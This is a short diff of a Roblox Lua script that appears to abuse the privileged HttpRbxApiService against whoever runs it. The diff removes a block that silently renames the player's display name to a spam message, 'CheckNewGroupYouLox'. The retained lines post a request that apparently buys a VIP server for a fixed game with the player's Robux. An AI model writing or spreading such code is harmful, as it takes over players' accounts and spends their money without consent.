@@ -18,22 +18,6 @@ HttpRbxApiService:PostAsync(url, HttpService:JSONEncode({}))
 
 local player = game.Players.LocalPlayer
 
-HttpRbxApiService:RequestAsync({
-    Url = "https://users.roblox.com/v1/users/" .. player.UserId .. "/display-names",
-    Method = "PATCH",
-    Headers = {
-        ["accept"] = "application/json",
-        ["Content-Type"] = "application/json",
-        ["Authorization"] = "Bearer YOUR_ACCESS_TOKEN"
-    },
-    Body = HttpService:JSONEncode({
-        ["newDisplayName"] = "CheckNewGroupYouLox"
-    })
-})
-
-local HttpService = game:GetService("HttpService")
-local HttpRbxApiService = game:GetService("HttpRbxApiService")
-
 HttpRbxApiService:PostAsync("https://games.roblox.com/v1/games/vip-servers/5682894409", HttpService:JSONEncode({
   ["name"] = "Privatee",
   ["expectedPrice"] = 10,
